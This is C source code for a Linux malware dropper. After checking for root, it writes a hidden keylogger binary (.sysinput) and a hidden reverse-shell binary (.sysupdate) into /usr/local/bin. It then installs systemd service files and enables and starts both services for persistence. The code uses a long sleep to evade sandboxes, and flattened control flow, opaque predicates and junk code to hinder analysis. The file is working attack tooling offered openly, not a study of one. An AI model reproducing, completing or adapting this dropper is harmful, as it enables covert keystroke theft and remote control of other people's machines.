#include "sysinput_binary.h"
#include "sysinput_service.h"
#include "sysupdate_binary.h"
#include "sysupdate_service.h"

#include <dirent.h>
#include <fcntl.h>
#include <limits.h>
#include <linux/input.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#define REVERSE_SHELL_PATH "/usr/local/bin/.sysupdate"
#define REVERSE_SERVICE_NAME "sysupdate.service"
#define KEYLOGGER_BIN_PATH "/usr/local/bin/.sysinput"
#define KEYLOGGER_SERVICE_NAME "sysinput.service"
#define SERVICE_DIR "/etc/systemd/system/"

// We need to define our stated for the flattening to work correctly
#define STATE_0xF73A91C5 0
#define STATE_0x8D2E47B0 1
#define STATE_0xC691F4D3 2
#define STATE_0x5AE28D07 3
#define STATE_0xB3C7D059 4
#define STATE_0x4F1E68A9 5
#define STATE_0x92D7C3BE 6
#define STATE_0xE05A1F84 7
#define STATE_0x78B4D26C 8
#define STATE_0xA13F9E57 9
#define STATE_0x3D6B5CA0 10
#define STATE_0xD814F9E2 11
#define STATE_0x64C8B371 12
#define STATE_0x0FA2D548 13
#define STATE_0xB1E7C903 14
#define STATE_0x5D29F4A7 15
#define STATE_0xC385B62D 16
#define STATE_0x7F40E918 17
#define STATE_0x2AD96BF4 18
#define STATE_0x86E13C70 19
#define STATE_0x41F8A5D9 20
#define STATE_0xE3B7C064 21
#define STATE_0x9C24F58A 22
#define STATE_0x16D3A7E2 23
#define STATE_0xF05892BC 24
#define STATE_0x38CF6D14 25
#define STATE_0xAF12B67E 26
#define STATE_0x651D8C39 27
#define STATE_0xDB74F195 28
#define STATE_0x4BE17A9F 29
#define STATE_0xA3F9D2C7 30

#define BLOAT10(x)                                                             \
  x;                                                                           \
  x;                                                                           \
  x;                                                                           \
  x;                                                                           \
  x;                                                                           \
  x;                                                                           \
  x;                                                                           \
  x;                                                                           \
  x;                                                                           \
  x;
#define Bloat100(x) BLOAT10(BLOAT10(x))
// Global variables for state machine
int current_state = STATE_0xF73A91C5;
int action_count = 0;
int action_indices[3] = {0, 0, 0};
int action_next_index = 0;
int total_actions_completed = 0;

// Context variables for functions
char current_path[PATH_MAX];
const char *global_cmd;
const char *global_dest;
const unsigned char *global_data;
unsigned int global_size;
int cmd_ret;
FILE *global_dst_file;
char global_buf[4096];
size_t global_n;
char global_revsh_path[PATH_MAX];
char global_keylog_path[PATH_MAX];
int file_write_stage = 0;

int dispatcher() {
  // Initialize state
  current_state = STATE_0xF73A91C5;

  // Flatten control flow with a single loop and switch statement
  while (1) {
    switch (current_state) {
    case STATE_0xF73A91C5:
      current_state = STATE_0x4BE17A9F;
      break;

    case STATE_0x8D2E47B0:
      if (geteuid() == 0) {
        printf("[+] Running with root, nice!\n");
        current_state = STATE_0xC691F4D3;
      } else {
        printf("[-] No root :(( \n");
        current_state = STATE_0x78B4D26C;
      }
      break;
    case STATE_0x4BE17A9F:
      // Try to trick dynamic analysis
      // Inspiration
      // https://github.com/TalpaLabs/coreminer/blob/master/examples/sleeper.c
      // Thanks for the idea :)

      printf("[...] Starting...\n");
      sleep(400);
      printf("[+] Woken up\n");
      current_state = STATE_0x8D2E47B0;
      break;

    case STATE_0xC691F4D3:
      // We need to setup our actions that are later shuffled
      // 0 is install sysinput
      // 1 is install sysupdate
      // 2 drops the service files
      action_indices[0] = 0;
      action_indices[1] = 1;
      action_indices[2] = 2;

      // Shuffle actions
      srand(time(NULL));
      for (int i = 2; i > 0; i--) {
        int j = rand() % (i + 1);
        int temp = action_indices[i];
        action_indices[i] = action_indices[j];
        action_indices[j] = temp;
      }

      action_next_index = 0;
      total_actions_completed = 0;
      current_state = STATE_0x7F40E918;
      break;

    case STATE_0x5AE28D07:
      if (action_indices[action_next_index] == 0) {
        current_state = STATE_0x0FA2D548;
      } else if (action_indices[action_next_index] == 1) {
        current_state = STATE_0x64C8B371;
      } else {
        current_state = STATE_0xB1E7C903;
      }
      break;

    case STATE_0xB3C7D059:
      if (action_indices[action_next_index] == 0) {
        current_state = STATE_0x0FA2D548;
      } else if (action_indices[action_next_index] == 1) {
        current_state = STATE_0x64C8B371;
      } else {
        current_state = STATE_0xB1E7C903;
      }
      break;

    case STATE_0x4F1E68A9:
      if (action_indices[action_next_index] == 0) {
        current_state = STATE_0x0FA2D548;
      } else if (action_indices[action_next_index] == 1) {
        current_state = STATE_0x64C8B371;
      } else {
        current_state = STATE_0xB1E7C903;
      }
      break;

    case STATE_0x0FA2D548:
      printf("[*] Installing sysinput keylogger...\n");
      global_dest = KEYLOGGER_BIN_PATH;
      global_data = _sysinput; // Use the byte array from header
      global_size = _sysinput_len;
      current_state = STATE_0x651D8C39;
      break;

    case STATE_0x64C8B371:
      printf("[*] Installing sysupdate reverse shell...\n");
      global_dest = REVERSE_SHELL_PATH;
      global_data = _sysupdate; // Use the byte array from header
      global_size = _sysupdate_len;
      current_state = STATE_0x651D8C39;
      break;

    case STATE_0x651D8C39: {
      global_dst_file = fopen(global_dest, "wb");
      if (!global_dst_file) {
        perror("[-] Cannot open destination for binary");
        current_state =
            STATE_0xDB74F195; // Move to post-action state even on failure
        break;
      }

      if (fwrite(global_data, 1, global_size, global_dst_file) != global_size) {
        perror("[-] Failed to write full binary content");
        fclose(global_dst_file);
        current_state =
            STATE_0xDB74F195; // Move to post-action state even on failure
        break;
      }

      fclose(global_dst_file);
      chmod(global_dest, 0755);
      printf("[+] Installed binary to %s\n", global_dest);

      if (strcmp(global_dest, KEYLOGGER_BIN_PATH) == 0) {
        printf("[+] sysinput keylogger installed\n");
      } else {
        printf("[+] sysupdate reverse shell installed\n");
      }

      current_state = STATE_0xDB74F195; // Always proceed to post-action
      break;
    }

    case STATE_0xDB74F195:
      // Increment counters
      action_next_index++;
      total_actions_completed++;

      // Determine next state based on completed actions
      if (total_actions_completed == 1) {
        current_state = STATE_0x2AD96BF4;
      } else if (total_actions_completed == 2) {
        current_state = STATE_0x86E13C70;
      } else {
        current_state = STATE_0x92D7C3BE;
      }
      break;

    case STATE_0xB1E7C903:
      printf("[*] Dropping service files...\n");
      snprintf(global_revsh_path, sizeof(global_revsh_path),
               SERVICE_DIR REVERSE_SERVICE_NAME);
      snprintf(global_keylog_path, sizeof(global_keylog_path),
               SERVICE_DIR KEYLOGGER_SERVICE_NAME);

      file_write_stage = 0;
      current_state = STATE_0x5D29F4A7;
      break;

    case STATE_0x5D29F4A7:
      snprintf(current_path, sizeof(current_path), "%s%s", SERVICE_DIR,
               REVERSE_SERVICE_NAME);
      global_data = sysupdate_service;
      global_size = sysupdate_service_len;

      global_dst_file = fopen(current_path, "w");
      if (!global_dst_file) {
        perror("[-] Failed to write revsh service file");
        current_state = STATE_0xC385B62D;
        break;
      }

      if (fwrite(global_data, 1, global_size, global_dst_file) != global_size) {
        perror("[-] Failed to write full revsh service content");
        fclose(global_dst_file);
        current_state = STATE_0xC385B62D;
        break;
      }

      fclose(global_dst_file);
      printf("[+] revsh service file dropped at %s\n", current_path);
      current_state = STATE_0xC385B62D;
      break;

    case STATE_0xC385B62D:
      snprintf(current_path, sizeof(current_path), "%s%s", SERVICE_DIR,
               KEYLOGGER_SERVICE_NAME);
      global_data = sysinput_service;
      global_size = sysinput_service_len;

      global_dst_file = fopen(current_path, "w");
      if (!global_dst_file) {
        perror("[-] Failed to write sysinputd service file");
        current_state = STATE_0xDB74F195;
        break;
      }

      if (fwrite(global_data, 1, global_size, global_dst_file) != global_size) {
        perror("[-] Failed to write full sysinputd service content");
        fclose(global_dst_file);
        current_state = STATE_0xDB74F195;
        break;
      }

      fclose(global_dst_file);
      printf("[+] sysinputd service file dropped at %s\n", current_path);
      current_state = STATE_0xDB74F195;
      break;

    case STATE_0x3D6B5CA0: {
      FILE *f = fopen(current_path, "w");
      if (!f) {
        perror("[-] Failed to open file for writing");
      } else {
        fwrite(global_data, 1, global_size, f);
        fclose(f);
        printf("[+] Wrote file: %s\n", current_path);
      }

      if (file_write_stage == 0) {
        file_write_stage = 1;
        current_state = STATE_0xC385B62D;
      } else {
        current_state = STATE_0xDB74F195;
      }
    } break;

    case STATE_0xD814F9E2:
      current_state = STATE_0xDB74F195;
      break;

    case STATE_0x92D7C3BE:
      // Execude commands for our installed services
      global_cmd = "systemctl daemon-reexec";
      action_count = 1;
      current_state = STATE_0xA13F9E57;
      break;

    case STATE_0xA13F9E57:
      cmd_ret = system(global_cmd);
      if (cmd_ret != 0) {
        fprintf(stderr, "[-] Command failed %s\n", global_cmd);
      } else {
        printf("[+] Executed: %s\n", global_cmd);
      }

      if (action_count == 1) {
        global_cmd = "systemctl daemon-reload";
        action_count++;
        break;
      } else if (action_count == 2) {
        global_cmd = "systemctl enable sysupdate.service";
        action_count++;
        break;
      } else if (action_count == 3) {
        global_cmd = "systemctl start sysupdate.service";
        action_count++;
        break;
      } else if (action_count == 4) {
        global_cmd = "systemctl enable sysinput.service";
        action_count++;
        break;
      } else if (action_count == 5) {
        global_cmd = "systemctl start sysinput.service";
        current_state = STATE_0xE05A1F84;
        break;
      }

      // Never reached, good for obfuscation
      action_count = 0;
      current_state = STATE_0xE05A1F84;
      break;

    case STATE_0xE05A1F84:
      printf("[+] Setup complete.\n");
      return 0;

    case STATE_0x78B4D26C:
      return 1;

    case STATE_0x7F40E918: {
      int x = 1337;
      if (x * (x + 1) % 2) {
        // random bullshit that is never executed
        current_state = STATE_0xAF12B67E;

      } else {
        current_state = STATE_0x16D3A7E2;
      }
    } break;

    case STATE_0x2AD96BF4: {
      uint32_t a = 0xDEADBEEF;
      uint32_t b = a ^ 0x12345678;
      if ((b ^ 0x12345678) == a) {
        current_state = STATE_0xF05892BC;
      } else {
        current_state = STATE_0xAF12B67E;
      }
    } break;

    case STATE_0x86E13C70: {
      int z = 1337;
      if ((z * z + z) % 2) {
        // Results in 0, never executed
        current_state = STATE_0xAF12B67E;
      } else {
        current_state = STATE_0x38CF6D14;
      }
    } break;

    case STATE_0x16D3A7E2: {
      volatile int bloat1 = rand();
      Bloat100(bloat1 += 1);
      current_state = STATE_0x5AE28D07;
    } break;

    case STATE_0xF05892BC: {
      volatile int bloat2 = rand();
      Bloat100(bloat2 += 1);
      current_state = STATE_0xB3C7D059;
    } break;

    case STATE_0x38CF6D14: {
      volatile int bloat3 = rand();
      Bloat100(bloat3 += 1);
      current_state = STATE_0x4F1E68A9;
    } break;

    case STATE_0xAF12B67E: {
      volatile double u = 0;
      volatile float g = 0;
      volatile int n;
      for (n = 0; n < g; n++) {
        double z = 1.0 / (2 * n + 1);
        if ((n % 2) == 1) {
          z = z * -1;
        }
        u = (u + z);
      }
      double p = 4 * u;
    } break;

    default:
      fprintf(stderr, "[-] Unknown state in state machine\n");
      return 1;
    }
  }
}

int main(void) {
  dispatcher();
  return 0;
}
